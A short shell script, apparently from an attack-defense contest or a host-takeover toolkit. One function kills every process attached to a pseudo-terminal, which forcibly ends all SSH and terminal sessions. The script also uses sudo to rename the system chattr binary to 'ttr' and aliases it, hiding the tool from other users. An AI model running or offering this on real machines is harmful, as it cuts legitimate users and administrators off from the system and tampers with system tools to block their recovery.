killssh() {
    for pts in /dev/pts/*; do
        fuser -u $pts -k
    done
}

showtty() {
    ps -aux | grep tty
}

if [ "`which chattr 2>/dev/null`" != "" ]; then
    sudo mv /usr/bin/chattr /usr/bin/ttr 
fi

alias chattr=/usr/bin/ttr
